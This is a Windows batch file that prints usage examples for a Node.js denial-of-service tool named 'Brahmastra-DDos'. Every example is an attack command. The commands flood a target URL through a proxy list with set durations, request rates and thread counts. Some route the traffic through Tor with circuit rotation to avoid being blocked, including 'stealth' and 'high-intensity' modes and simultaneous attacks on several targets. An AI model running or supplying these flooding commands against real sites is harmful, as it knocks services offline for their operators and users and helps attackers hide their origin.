@echo off
echo ========================================
echo    Brahmastra-DDos Demo Examples
echo ========================================
echo.
echo Demo Mode Examples:
echo.
echo Quick 5-second demo:
echo   node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt demo
echo.
echo 1-minute demo with high rate:
echo   node Brahmastra-DDos.js https://example.com 60 64 4 proxy.txt demo
echo.
echo 5-minute demo with multiple threads:
echo   node Brahmastra-DDos.js https://example.com 300 32 8 proxy.txt demo
echo.
echo Demo with --demo flag:
echo   node Brahmastra-DDos.js https://example.com 10 16 2 proxy.txt --demo
echo.
echo API endpoint demo:
echo   node Brahmastra-DDos.js https://api.example.com/endpoint 30 20 1 proxy.txt demo
echo.
echo ========================================
echo    Tor Circuit Examples
echo ========================================
echo.
echo Basic Tor attack:
echo   node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor
echo.
echo Tor with custom rotation (every 2 minutes):
echo   node Brahmastra-DDos.js https://example.com 300 64 8 proxy.txt --tor --tor-rotate=120
echo.
echo Demo mode with Tor simulation:
echo   node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo --tor
echo.
echo High-intensity Tor attack:
echo   node Brahmastra-DDos.js https://example.com 120 128 16 proxy.txt --tor --tor-rotate=45
echo.
echo ========================================
echo    Tor IP Check Examples
echo ========================================
echo.
echo Standalone Tor IP check:
echo   node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --tor --show-tor-ip
echo.
echo Demo mode with Tor IP display:
echo   node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo --tor --show-tor-ip
echo.
echo Tor attack with IP display:
echo   node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor --show-tor-ip
echo.
echo ========================================
echo    Advanced Examples
echo ========================================
echo.
echo Stealth mode with Tor:
echo   node Brahmastra-DDos.js https://target.com 180 16 12 proxy.txt --tor --tor-rotate=60
echo.
echo Extended duration with Tor:
echo   node Brahmastra-DDos.js https://target.com 600 32 8 proxy.txt --tor --tor-rotate=120
echo.
echo Multi-target Tor attacks:
echo   REM Terminal 1:
echo   node Brahmastra-DDos.js https://target1.com 300 32 4 proxy.txt --tor
echo   REM Terminal 2:
echo   node Brahmastra-DDos.js https://target2.com 300 32 4 proxy.txt --tor
echo.
pause
